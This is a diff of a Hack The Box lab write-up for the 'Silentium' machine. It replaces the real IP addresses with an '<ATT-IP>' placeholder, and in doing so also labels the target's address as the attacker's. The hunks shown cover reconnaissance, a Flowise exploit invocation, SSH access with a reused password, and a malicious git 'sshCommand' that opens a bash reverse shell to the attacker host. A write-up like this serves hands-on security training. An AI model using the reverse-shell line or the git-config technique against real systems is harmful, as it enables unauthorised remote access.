@@ -1,7 +1,7 @@
 # Silentium — HTB Writeup
 
 **Machine:** Silentium  
-**IP:** `10.129.76.149`  
+**IP:** `<ATT-IP>`  
 **OS:** Ubuntu 24.04.4 LTS (host) + Alpine Linux 3.22 (Docker container)  
 **Difficulty:** Hard
 
@@ -12,7 +12,7 @@
 ### Port scan
 
 ```bash
-nmap -p- --min-rate 5000 -T4 10.129.76.149
+nmap -p- --min-rate 5000 -T4 <ATT-IP>
 ```
 
 **Open ports:**
@@ -23,7 +23,7 @@ nmap -p- --min-rate 5000 -T4 10.129.76.149
 ### Add host
 
 ```bash
-echo "10.129.76.149 silentium.htb" | sudo tee -a /etc/hosts
+echo "<ATT-IP> silentium.htb" | sudo tee -a /etc/hosts
 ```
 
 ### Vhost fuzzing
@@ -43,7 +43,7 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
 Add the Flowise host:
 
 ```bash
-echo "10.129.76.149 staging.silentium.htb" | sudo tee -a /etc/hosts
+echo "<ATT-IP> staging.silentium.htb" | sudo tee -a /etc/hosts
 ```
 
 ---
@@ -142,7 +142,7 @@ Example exploit invocation:
 python3 flowise_chain.py \
   -t http://staging.silentium.htb \
   --api-key <KEY> \
-  --lhost 10.10.14.48 \
+  --lhost <ATT-IP> \
   --lport 4444
 ```
 
@@ -239,7 +239,7 @@ No flag was found.
 The reused password works for the `ben` account on the host:
 
 ```bash
-ssh ben@10.129.76.149
+ssh ben@<ATT-IP>
 ```
 
 Password:
@@ -355,7 +355,7 @@ Therefore, the Docker socket is not directly exploitable from the `ben` account.
 Add the internal Gogs hostname:
 
 ```bash
-echo "10.129.76.149 staging-v2-code.dev.silentium.htb" | sudo tee -a /etc/hosts
+echo "<ATT-IP> staging-v2-code.dev.silentium.htb" | sudo tee -a /etc/hosts
 ```
 
 Open:
@@ -480,7 +480,7 @@ Clone the repository locally and create a symlink targeting:
 The malicious configuration can contain an `sshCommand`, for example:
 
 ```ini
-sshCommand = bash -c 'bash -i >& /dev/tcp/10.10.14.48/4444 0>&1'
+sshCommand = bash -c 'bash -i >& /dev/tcp/<ATT-IP>/4444 0>&1'
 ```
 
 The important detail is that merely writing `.git/config` does **not** immediately execute the command.
@@ -500,7 +500,7 @@ or another Git operation such as a push/fetch initiated through the Gogs interfa
 In this case, packet capture showed a connection attempt to:
 
 ```text
-10.10.14.48:4444
+<ATT-IP>:4444
 ```
 
 However, the `nc` listener did not successfully handle the connection.
